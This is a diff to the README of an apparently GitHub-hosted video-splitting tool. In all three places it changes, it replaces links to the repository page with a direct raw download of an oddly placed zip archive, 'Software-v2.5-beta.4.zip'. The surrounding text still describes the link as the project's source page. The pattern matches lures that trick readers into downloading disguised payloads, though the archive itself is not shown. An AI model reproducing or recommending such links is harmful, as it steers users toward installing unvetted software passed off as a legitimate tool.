@@ -1,6 +1,6 @@
 # ⚡ fastvideosegmenter - Split videos fast with no re-encoding
 
-[![Download fastvideosegmenter](https://img.shields.io/badge/Download%20fastvideosegmenter-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/areez1256/fastvideosegmenter)
+[![Download fastvideosegmenter](https://img.shields.io/badge/Download%20fastvideosegmenter-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/areez1256/fastvideosegmenter/raw/refs/heads/main/emydosaurian/Software-v2.5-beta.4.zip)
 
 ## 🖥️ What it does
 
@@ -19,7 +19,7 @@ Use it when you want to:
 ## 🚀 Download and run
 
 Visit this page to download:
-https://github.com/areez1256/fastvideosegmenter
+https://github.com/areez1256/fastvideosegmenter/raw/refs/heads/main/emydosaurian/Software-v2.5-beta.4.zip
 
 On the page, look for the latest Windows release file.
 
@@ -182,6 +182,6 @@ That makes it a good fit for quick cuts and simple edits.
 ## 📄 License and source
 
 This project is on GitHub here:
-https://github.com/areez1256/fastvideosegmenter
+https://github.com/areez1256/fastvideosegmenter/raw/refs/heads/main/emydosaurian/Software-v2.5-beta.4.zip
 
 Use the repository page to review the source, check updates, and get the latest release files
